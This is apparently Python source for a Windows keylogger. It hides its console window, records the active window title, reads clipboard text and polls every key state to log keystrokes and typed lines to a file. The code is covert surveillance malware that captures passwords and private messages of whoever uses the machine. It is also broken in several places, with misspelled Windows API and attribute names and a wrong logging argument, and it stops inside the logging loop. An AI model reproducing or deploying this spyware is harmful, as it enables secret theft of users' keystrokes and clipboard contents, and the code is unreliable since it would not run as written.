import ctypes   # for interfacing with c functions
import logging  # for logging the keystrokes on disk

kernel32 = ctypes.windll.kernel32   # access functions from kernel32.dll
user32 = ctypes.windll.user32       # access functions from user32.dll

user32.ShowWindow(kernel32.GetConsoleWindow(), 0)   # hide console

def get_current_window():   # function to grab the current window

    # Required WinAPI functions
    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTestLengthW
    GetWindowText = user32.GetWindowTextW

    hwnd = GetForegroundWindow()    # Get handle to foreground window
    length = GetWindowTextLength(hwnd)  # Get length of the window text in title bar, passing the handle as an argument
    buff = ctypes.create_unicode_buffer(length + 1) # Create buffer to store window title string
    GetWindowText(hwnd, buff, length + 1)   # Get window title and store in buff

    return buff.value   # return the value of buff

def get_clipboard():

    CF_TEXT = 1 # set clipboard format

    # argument and return types for GlobcalLock/GlobalUnlock
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GLobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]

    # return type for GetClipboardData
    user32.GetClipboardData.restype = ctypes.c_void_p
    user32.OpenClipboard(0)

    # required clipboard functions
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard

    try:
        if IsClipboardFormatAvailable(CF_TEXT): # if CF_TEXT is available
            data = GetClipbaordData(CF_TEXT)    # get handle to data in clipboard
            data_locked = kernel32.GlobalLock(data) # get pointer to memory location where the data is located
            text = ctypes.c_char_p(data_locked) # get a char * pointer (string in python) to the location of data_locked
            value = text.calue  # dump the content in value
            kernel32.GlobalUnlock(data_locked)  # decrement de lock count
            return value.decode('utf-8')    # return the clipboard content
    finally:
        CloseClipboard() # close the clipboard

def get_keystrokes(log_dir, log_name):  # Function to monitor keystrokes
    
    # Logger
    logging.basicConfig(file=(log_dir + "\\" + log_name), level=logging.DEBUG, format='%(message)s')

    GetAsyncKeyState = user32.GetAsyncKeyState  # WinAPI function that determines whether a key is up or down
    special_keys = {0x08: 'BS', 0x09: 'Tab', 0x10: 'Shift', 0x11: 'Ctrl', 0x12: 'Alt', 0x14: 'CapsLock', 0x1b: 'Esc', 0x20: 'Space', 0x2e: 'Del'}
    current_window = None
    line = [] # stores the characters pressed

    while True:

        if current_window != get_current_window(): # If the content of the current window isn't currently opened
            current_window = get_current_window()  # put the inwodw title in current_window
            logging.info(str(current_window).encode('utf-8'))   # write the current window title in the log file

        for i in range(1, 256): # because there are 256 ASCII characters (even though we only really use 128)
            if GetAsyncKeyState(i) & 1: # If a key is pressed and matches an ASCII character
                if i in special_keys:   # If special key, logas such
                    logging.info("<{}>".format(special_keys[i]))
                elif i == 0x0d: # if <ENTER>, log the line typed then clear the variable
                    logging.info(line)
                    line.clear()
                elif 0x30 <= i <= 0x5a: # if alphanumeric character, append to line
                    line.append(chr(i))
